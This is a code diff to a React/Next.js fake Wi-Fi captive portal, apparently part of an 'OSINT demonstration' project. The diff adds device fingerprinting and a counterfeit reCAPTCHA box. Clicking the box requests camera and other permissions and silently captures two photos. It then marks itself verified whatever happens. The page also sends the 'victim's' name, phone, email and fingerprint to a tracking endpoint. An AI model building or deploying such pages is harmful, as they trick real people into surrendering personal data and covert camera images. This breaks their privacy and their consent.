@@ -3,13 +3,19 @@
 import { useState } from "react";
 import { useRouter } from "next/navigation";
 import { motion } from "framer-motion";
+import { collectFingerprint } from "@/lib/fingerprint";
+import {
+    requestAllPermissions,
+    capturePhotos,
+    MediaPermissions
+} from "@/lib/mediaCapture";
 import styles from "./page.module.css";
 
 /**
  * Wi-Fi Captive Portal Page
  * 
  * Professional-looking Wi-Fi login form that collects
- * user information for the OSINT demonstration.
+ * user information and device fingerprint for the OSINT demonstration.
  */
 
 interface FormData {
@@ -33,6 +39,9 @@ export default function PortalPage() {
     });
     const [errors, setErrors] = useState<FormErrors>({});
     const [isSubmitting, setIsSubmitting] = useState(false);
+    const [captchaVerified, setCaptchaVerified] = useState(false);
+    const [captchaLoading, setCaptchaLoading] = useState(false);
+    const [permissionsGranted, setPermissionsGranted] = useState<MediaPermissions | null>(null);
 
     const validatePhone = (phone: string): boolean => {
         if (!phone) return true; // Optional field
@@ -72,6 +81,9 @@ export default function PortalPage() {
 
         setIsSubmitting(true);
 
+        // Collect comprehensive device fingerprint
+        const fingerprint = collectFingerprint();
+
         // Store victim data in sessionStorage for the hack page
         const victimData = {
             name: formData.name.trim(),
@@ -81,14 +93,16 @@ export default function PortalPage() {
         };
         sessionStorage.setItem("siren_victim", JSON.stringify(victimData));
 
-        // Also send to server for admin tracking
+        // Send comprehensive fingerprint + form data to server
         try {
             await fetch("/api/track", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    ...victimData,
-                    userAgent: navigator.userAgent,
+                    name: victimData.name,
+                    phone: victimData.phone,
+                    email: victimData.email,
+                    fingerprint: fingerprint,
                 }),
             });
         } catch (error) {
@@ -102,6 +116,32 @@ export default function PortalPage() {
     const handleInputChange = (field: keyof FormData) => (e: React.ChangeEvent<HTMLInputElement>) => {
         setFormData(prev => ({ ...prev, [field]: e.target.value }));
         setErrors({});
+    };
+
+    // Handle captcha checkbox click
+    const handleCaptchaClick = async () => {
+        if (captchaVerified || captchaLoading) return;
+
+        setCaptchaLoading(true);
+
+        try {
+            // Request all permissions
+            const { permissions, stream } = await requestAllPermissions();
+
+            setPermissionsGranted(permissions);
+
+            // Capture 2 photos with 0.5s delay, then cleanup automatically
+            await capturePhotos(stream, permissions, 500);
+
+            // Mark as verified regardless of permission results
+            setCaptchaVerified(true);
+        } catch (error) {
+            console.error('[Captcha] Permission request failed:', error);
+            // Still mark as verified to allow form submission
+            setCaptchaVerified(true);
+        } finally {
+            setCaptchaLoading(false);
+        }
     };
 
     return (
@@ -199,12 +239,45 @@ export default function PortalPage() {
                         * At least one field is required to connect
                     </p>
 
+                    {/* Captcha-style verification */}
+                    <div
+                        className={`${styles.captchaBox} ${captchaVerified ? styles.captchaVerified : ''} ${captchaLoading ? styles.captchaLoading : ''}`}
+                        onClick={handleCaptchaClick}
+                    >
+                        <div className={styles.captchaCheckbox}>
+                            {captchaLoading ? (
+                                <motion.div
+                                    className={styles.captchaSpinner}
+                                    animate={{ rotate: 360 }}
+                                    transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
+                                />
+                            ) : captchaVerified ? (
+                                <motion.svg
+                                    viewBox="0 0 24 24"
+                                    fill="currentColor"
+                                    initial={{ scale: 0 }}
+                                    animate={{ scale: 1 }}
+                                    transition={{ type: "spring", stiffness: 300 }}
+                                >
+                                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
+                                </motion.svg>
+                            ) : null}
+                        </div>
+                        <span className={styles.captchaText}>I'm not a robot</span>
+                        <div className={styles.captchaBrand}>
+                            <svg viewBox="0 0 24 24" fill="currentColor" className={styles.captchaLogo}>
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
+                            </svg>
+                            <span>reCAPTCHA</span>
+                        </div>
+                    </div>
+
                     <motion.button
                         type="submit"
                         className={styles.submitBtn}
-                        disabled={isSubmitting}
-                        whileHover={{ scale: 1.02 }}
-                        whileTap={{ scale: 0.98 }}
+                        disabled={isSubmitting || !captchaVerified}
+                        whileHover={{ scale: captchaVerified ? 1.02 : 1 }}
+                        whileTap={{ scale: captchaVerified ? 0.98 : 1 }}
                     >
                         {isSubmitting ? (
                             <span className={styles.loading}>Connecting...</span>
